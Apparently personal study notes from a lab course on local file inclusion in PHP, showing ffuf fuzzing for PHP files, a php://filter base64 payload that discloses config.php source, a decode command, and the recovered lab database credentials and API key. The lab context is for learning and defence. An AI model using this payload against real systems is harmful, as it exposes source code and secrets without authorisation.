Many popular web applications are developed in PHP, along with various custom web applications built with different PHP frameworks, like Laravel or Symfony. If we identify an LFI vulnerability in PHP web applications, then we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.

### Input Filters
[PHP Filters](https://www.php.net/manual/en/filters.php) are a type of PHP wrapper, where we can pass different types of input and have it filtered by the filter we specify. To use PHP wrapper streams, we can use the `php://` scheme in our string, and we can access the PHP filter wrapper with `php://filter/`.

The `filter` wrapper has several parameters, but the main ones we require for our attack are `resource` and `read`. The `resource` parameter is required for filter wrappers, and with it we can specify the stream we would like to apply the filter on (e.g. a local file), while the `read` parameter can apply different filters on the input resource, so we can use it to specify which filter we want to apply on our resource.

There are four different types of filters available for use, which are [String Filters](https://www.php.net/manual/en/filters.string.php), [Conversion Filters](https://www.php.net/manual/en/filters.convert.php), [Compression Filters](https://www.php.net/manual/en/filters.compression.php), and [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php). You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the `convert.base64-encode` filter, under `Conversion Filters`.

**Fuzzing for PHP Files**
```shell-session
realCustampin@htb[/htb]$ ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php

...SNIP...

index                   [Status: 200, Size: 2652, Words: 690, Lines: 64]
config                  [Status: 302, Size: 0, Words: 1, Lines: 1]
```

### Standard PHP Inclusion
http://SERVER_IP:PORT/index.php?language=config
![[Pasted image 20251128083532.png]]
- Notice that the config.php file is executed resulting in a blank page on the website. This is most likely due to the php file not rendering any HTML output. 

### Source Code Disclosure

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter. Let's try to read the source code of `config.php` using the base64 filter, by specifying `convert.base64-encode` for the `read` parameter and `config` for the `resource` parameter, as follows:

Code: url

```url
php://filter/read=convert.base64-encode/resource=config
```

http://SERVER_IP:PORT/index.php?language=php://filter/read=convert.base64-encode/resource=config
![[Pasted image 20251128083702.png]]
- As you can see, our base64 filter returned a string that we are able to decode and ultimately view that source code. 
- We can decode using the following shell commands:

```shell-session
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

Or we can utilize websites like [[CyberChefhttps://gchq.github.io/CyberChef/]] to automatically do it fo

```php

<?php

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

$config = array(
  'DB_HOST' => 'db.inlanefreight.local',
  'DB_USERNAME' => 'root',
  'DB_PASSWORD' => 'HTB{n3v3r_$t0r3_pl4!nt3xt_cr3d$}',
  'DB_DATABASE' => 'blogdb'
);

$API_KEY = "Awew242GDshrf46+35/k";

```
